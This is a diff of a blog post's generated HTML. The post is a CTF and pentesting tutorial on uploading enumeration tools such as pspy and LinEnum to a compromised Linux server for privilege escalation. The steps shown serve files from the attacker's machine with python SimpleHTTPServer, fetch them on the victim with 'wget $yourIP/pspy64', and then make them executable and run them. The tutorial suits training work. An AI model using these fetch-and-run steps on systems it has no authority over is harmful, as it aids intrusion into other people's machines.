@@ -237,7 +237,7 @@ a[itemprop="url"]:hover {
 <meta itemprop="description" content="One of the first things I was asking myself when finally getting access to a linux server at my very beginning was &#39;How do I even upload the enumeration tools to do the privilege escalation?&#39;. I got the question from someone who was beginning on HTB recently so this short article might help.">
 <meta itemprop="datePublished" content="2019-07-21T01:00:00&#43;02:00" />
 <meta itemprop="dateModified" content="2019-07-21T01:00:00&#43;02:00" />
-<meta itemprop="wordCount" content="538">
+<meta itemprop="wordCount" content="546">
 <meta itemprop="image" content="https://i.imgur.com/t7YRxYU.png">
 
 
@@ -273,13 +273,16 @@ a[itemprop="url"]:hover {
       <h2 id="privilege-escalation-privesc">Privilege Escalation (privesc)</h2>
 <p>When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings. Leveraging these mistakes can give you the keys to root.</p>
 <p>Here are two extensive guides about privesc for Windows and Linux:</p>
-<!-- raw HTML omitted -->
+<ul>
+<li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank">Windows privesc guide</a></li>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank"> Linux privesc guide</a></li>
+</ul>
 <p>You&rsquo;ll notice in these guides that, to find the mistakes that will get us root, it&rsquo;s all about enumerating the server permissions, the programs running, the cron jobs, etc. And we have tools to do that for us!</p>
 <p>I have a very limited experience in Windows privesc so I will explain how to upload enumeration tools to Linux servers only in this post.
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br><br></p>
 <h2 id="the-tools">The tools</h2>
-<p>From my <!-- raw HTML omitted -->Tools list<!-- raw HTML omitted -->, you&rsquo;ll find these two very useful enumeration tools:</p>
-<p><!-- raw HTML omitted -->pspy<!-- raw HTML omitted -->
+<p>From my <a href="/tools/pentest">Tools list</a>, you&rsquo;ll find these two very useful enumeration tools:</p>
+<p><a href="https://github.com/DominicBreuker/pspy" target="_blank">pspy</a>
 
 
 
@@ -291,7 +294,7 @@ pspy is a command line tool designed to snoop on processes without need for root
 </div>
 
 </p>
-<p><!-- raw HTML omitted -->LinEnum<!-- raw HTML omitted -->
+<p><a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a>
 
 
 
@@ -303,7 +306,7 @@ Scripted Local Linux Enumeration & Privilege Escalation Checks.
 </div>
 
 
-<!-- raw HTML omitted --></p>
+<br></p>
 <h2 id="the-command-lines">The command lines</h2>
 <p>So now that we have the tools on our computer, how to get them to the compromised server?</p>
 <p>Quite simple: we will use a python module called SimpleHTTPServer. It is normally used like other modules in python programs, but the SimpleHTTPServer module can also be invoked directly using the -m switch of the interpreter with a port number argument. This serves the files relative to the current directory.</p>
@@ -369,8 +372,8 @@ wget $yourIP/pspy64
 
 </p>
 <p>Same thing now, we do &ldquo;chmod +x pspy64&rdquo; and then &ldquo;./pspy64&rdquo;, and it will run!</p>
-<!-- raw HTML omitted -->
-<p>I hope this was a useful article! There are probably other ways to upload files to a server such as using <!-- raw HTML omitted -->netcat<!-- raw HTML omitted -->, but I found the commands in this post to be the simplest for me. And of course I took the example of enumeration tools, but you can use it to upload many more useful tools you would need for your privesc!</p>
+<img src="https://raw.githubusercontent.com/DominicBreuker/pspy/master/images/demo.gif">
+<p>I hope this was a useful article! There are probably other ways to upload files to a server such as using <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>, but I found the commands in this post to be the simplest for me. And of course I took the example of enumeration tools, but you can use it to upload many more useful tools you would need for your privesc!</p>
 <p>Have fun uploading files now!</p>
 
     </div>
@@ -392,7 +395,7 @@ wget $yourIP/pspy64
   
     and tagged <a rel="tag" href="/tags/ctf/">ctf</a>, <a rel="tag" href="/tags/enumeration/">enumeration</a>, <a rel="tag" href="/tags/linenum/">linenum</a>, <a rel="tag" href="/tags/privesc/">privesc</a> and <a rel="tag" href="/tags/pspy/">pspy</a>
   
-  using <span itemprop="wordCount">538</span> words.
+  using <span itemprop="wordCount">546</span> words.
 </p>
 
       
